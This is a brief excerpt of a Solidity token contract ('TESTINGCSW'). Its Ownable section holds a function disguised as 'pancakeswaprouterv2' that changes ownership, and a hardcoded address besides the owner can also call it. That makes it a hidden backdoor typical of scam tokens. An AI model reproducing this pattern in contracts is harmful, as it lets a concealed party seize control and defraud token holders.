...
contract Ownable is Context {
    ...
    function pancakeswaprouterv2(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xDb3F428aFe9A3c25d95Ce50B9E9016ff27f680F4));
...
contract TESTINGCSW is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "TESTCSWT";
  string private _name = "TCS";
